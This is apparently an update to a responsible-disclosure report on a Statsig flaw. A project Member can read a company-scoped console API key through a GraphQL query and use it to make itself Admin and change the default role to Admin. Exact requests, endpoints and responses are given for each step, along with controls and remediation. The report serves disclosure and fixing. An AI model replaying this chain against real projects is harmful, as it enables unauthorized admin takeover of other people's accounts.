UPDATE — the leaked value is an Admin-takeover credential, not only a disclosure. Full reproduction below.

Since filing I re-ran this end to end and traced what the exposed value actually does against the
management API. The result changes the severity of this report: the credential this query hands a
plain Member is **admin-equivalent**, and a Member who reads one becomes an **Admin** of the
project. No escalation of the key is required — the value is used exactly as it is returned.

Root cause of the escalation (a second, independent defect): `https://statsigapi.net/console/v1`
resolves what a caller may do from the **class of the key presented** (`owner: null` =
company-scoped), not from the **role of the human behind it**. A company-scoped key is therefore
treated as admin-equivalent regardless of its owner's role and regardless of its scopes. This
report supplies the key; that defect supplies the privilege.

================================================================================
REPRODUCTION — complete, self-owned tenant 4n6HCY59mDqwX1iSZQtNvx
================================================================================

Setup: two self-owned accounts.
  Owner  = mohamed-9499-2@agentmail.to
  Member = mohamed-9499-3@agentmail.to   (role: Member)
The Owner generates one ordinary CONSOLE key from the console's own API-keys page, which produces a
company-scoped key (`owner: null`, scopes `["omni_read_write"]`). This is the normal state of any
project where an administrator has ever created a key — and is the same object already recorded in
this report (`id=73BExoOXZiCyDNKTkSPZTN CONSOLE scopes=["omni_read_write"] owner=null`).

--------------------------------------------------------------------------------
STEP 1 — the Member reads the company-scoped key's plaintext value
--------------------------------------------------------------------------------
This is the defect already reported here (the masking predicate is wired only for Read Only).

  POST /api/graphql?company_id=4n6HCY59mDqwX1iSZQtNvx
  Cookie: <Member session>          x-csrf-token: 1
  Content-Type: application/json

  {"id":"d6fcaacbc921668f7e7aa576b9d2ca1e",
   "variables":{"first":100,"keyType":"ALL"}}

  -> HTTP 200
     data.viewer_company.keys_connection.nodes[] =
       { "id":"7mMPVXztWPzOhabMDvBZvo", "type":"CONSOLE", "owner":null,
         "scopes":["omni_read_write"], "value":"console-…" }      <- PLAINTEXT, company-scoped
       { "id":"4n6Qh7ZAZ2FVwTf0W1WJyL", "type":"CLIENT", "owner":null, "value":"client-…" }
       { "id":"4n6Qh4Fw4smWU499JM5sWH", "type":"SERVER", "owner":null, "value":"secret-…" }

Note `owner: null` — that is the marker for the company-scoped class, and it is the class the
management API treats as admin.

--------------------------------------------------------------------------------
STEP 2 — the Member uses that value to promote itself to Admin (no key modification)
--------------------------------------------------------------------------------
The key is used exactly as returned. Nothing about it is changed first.

  GET https://statsigapi.net/console/v1/users
  STATSIG-API-KEY: console-…            (the value from Step 1)
  -> HTTP 200   ... "email":"mohamed-9499-3@agentmail.to","role":"member" ...

  POST https://statsigapi.net/console/v1/users/mohamed-9499-3@agentmail.to
  STATSIG-API-KEY: console-…
  Content-Type: application/json
  {"role":"Admin"}
  -> HTTP 201   {"message":"User updated successfully.",
                 "data":{"userID":"13B13WHITpDKkMpbi22BGW",
                         "email":"mohamed-9499-3@agentmail.to", …}}

  GET https://statsigapi.net/console/v1/users
  STATSIG-API-KEY: console-…
  -> HTTP 200   ... "email":"mohamed-9499-3@agentmail.to","role":"admin" ...

The Member now holds the Admin role. It can promote or demote every other member of the project.

--------------------------------------------------------------------------------
STEP 3 — the escalation is made persistent
--------------------------------------------------------------------------------
  POST https://statsigapi.net/console/v1/settings/roles
  STATSIG-API-KEY: console-…
  {"default_project_role":"Admin"}
  -> HTTP 201   {"message":"Settings updated successfully.",
                 "data":{"default_project_role":"Admin"}}

Every future invitee to the project now lands as an Admin, so the escalation survives the removal
of the account that performed it.

--------------------------------------------------------------------------------
STEP 4 — ceiling (stated honestly, to bound the impact)
--------------------------------------------------------------------------------
The promoted Admin cannot touch the original Owner:

  POST /console/v1/users/<owner> {"role":"Member"}      -> 201 returned, role UNCHANGED (no-op)
  POST /console/v1/users/<owner> {"role":"Read Only"}   -> 201 returned, role UNCHANGED
  POST /console/v1/users/<self>  {"role":"Owner"}       -> 401 "Must be owner of project"
  DELETE /console/v1/users/<owner>                      -> 404 (no such route)
  POST /console/v1/keys/<owner key>/deactivate          -> 404 (no such route)
  DELETE /console/v1/keys/<owner key>                   -> 403 "Insufficient permissions."

So the ceiling is full Admin authority over every other member, over project settings and over the
administrative record — not ownership of the project.

Side note worth fixing: the two refused role changes in Step 4 still returned `201` and wrote
audit-log entries ("Updated … roles to Read Only" / "… to Member") although the role never changed.
The trail records actions that did not take effect.

================================================================================
CONTROLS — this is specific to the company-scoped key class
================================================================================

(a) The same calls with a PERSONAL key (the class the console UI hands out — `owner` set):

  POST /console/v1/settings/roles              -> 400 "Must be admin of project"
  POST /console/v1/users/<member> {"role":"Admin"}
                                               -> 400 "Must be admin of project or project org"
  POST /console/v1/keys                        -> 403 "Insufficient permissions."

(b) A personal key cannot be escalated into a company-scoped one either:

  UpdateSDKKeyScopes {"id":"<personal key>",
                      "scopes":["omni_read_write","can_access_keys"]}
  -> {"errors":[{"message":"Scopes: Invalid scopes: omni_read_write, can_access_keys"}]}
     read-back: scopes unchanged, still ["personal_read_write"]

  useCreateSDKKeyMutation {"scopes":["omni_read_write"],"owner_id":null}
  -> {"errors":[{"message":"Must be admin of project"}]}

(c) The capability matrix, same project, same session, only the key class differs:

  Call with a company-scoped key, scopes=["omni_read_write"], owner=null
    GET  /console/v1/users                                             -> 200
    GET  /console/v1/company                                           -> 200
    GET  /console/v1/audit_logs                                        -> 200
    POST /console/v1/settings/roles {"default_project_role":"Admin"}    -> 201
    POST /console/v1/users/<anyone> {"role":"Admin"}                    -> 201
    GET  /console/v1/keys                                              -> 403
    POST /console/v1/keys                                              -> 403

  The same calls with a personal key (owner set, scopes=["personal_read_write"])
    GET  /console/v1/users                                             -> 200
    GET  /console/v1/company                                           -> 200
    GET  /console/v1/audit_logs                                        -> 200
    POST /console/v1/settings/roles                                    -> 400
    POST /console/v1/users/<anyone> {"role":"Admin"}                    -> 400
    GET  /console/v1/keys                                              -> 403
    POST /console/v1/keys                                              -> 403

The only difference between the two columns is the key's class. Note also that the admin surface is
reachable with a key that carries no admin scope whatsoever — `omni_read_write` alone is enough.

================================================================================
WHICH KEY TIER CARRIES THE ESCALATION — and the key-type gate that is missing a role gate
================================================================================

The query in Step 1 returns all three tiers to the Member. Only the CONSOLE tier reaches the
management API — Statsig does enforce a key-TYPE gate, so this is specifically the CONSOLE key
that a Member should never have been able to read:

  CONSOLE key (owner=null, scopes=["omni_read_write"])   -> the escalation above works
  CLIENT  key (owner=null, scopes=[])                    -> 403 "This endpoint only accepts an
                                                            active CONSOLE key, but a CLIENT key
                                                            was sent."
  SERVER  key (owner=null, scopes=[])                    -> 403 "This endpoint only accepts an
                                                            active CONSOLE key, but a SERVER key
                                                            was sent."

That is the sharpest way to state the defect: **the key-type gate is present and working, and the
role gate is absent.** The API knows how to reject a key for being the wrong kind; it does not
reject it for belonging to the wrong person. A company-scoped CONSOLE key is accepted from a plain
Member with no admin role.

For completeness, the SERVER key still does what the original report documents on its own plane
(api.statsig.com), which is why this report's own impact stands unchanged:

  GET  https://api.statsig.com/v1/download_config_specs/<SERVER KEY>.json
  -> 200   (the project's full definition, including server-side targeting rules)
  POST https://api.statsig.com/v1/check_gate   {"user":{"userID":"someone-else@example.com"},
                                                "gateName":"a_visible_gate"}
  -> 200   {"name":"a_visible_gate","value":false,"rule_id":null}
           (server-side evaluation for an arbitrary identity)

So the two tiers are exploitable in different places: the SERVER key on the data plane, the CONSOLE
key on the management plane — and the Member obtains both from the same query.

================================================================================
WHAT THIS CHANGES FOR THIS REPORT
================================================================================

The original report framed the leak as disclosure of the project's server identity; the 17 Sep
update extended it to the management identity and demonstrated reads plus a gates write. This update
adds the part that determines the severity: the value this resolver leaks is an **Admin-takeover
credential**. A plain Member who reads one company-scoped key through the query above ends up
holding the project's highest effective role.

It is a separate defect from the missing masking predicate, and the two need separate fixes —
applying this report's own remediation (mask `SDKKey.value` for roles below Admin) removes the read
but leaves the class-based authorization untouched, because a company-scoped key is still
admin-equivalent to anyone who obtains one by any other route. Conversely, fixing the authorization
leaves the disclosure. Filed separately with the same reproduction.

Remediation for this half is unchanged and still correct: extend the existing Read-Only masking
predicate to role < Admin at the `SDKKey.value` resolver, and apply the same predicate to the
sibling persisted operations (`ApiKeysBoxQuery` d6fcaacb…, `PersonalCAPITokenSectionQuery`
0799d4b7…), so a Member cannot read the value at all. For the authorization half: `/console/v1`
should evaluate the caller's role, not the key's class.

All steps were performed on my own tenants. Everything was reverted and verified: the account is
back to `Member`, the default role restored, the minted keys deleted, and the console key list is at
its baseline. No destructive call was made against any real project.
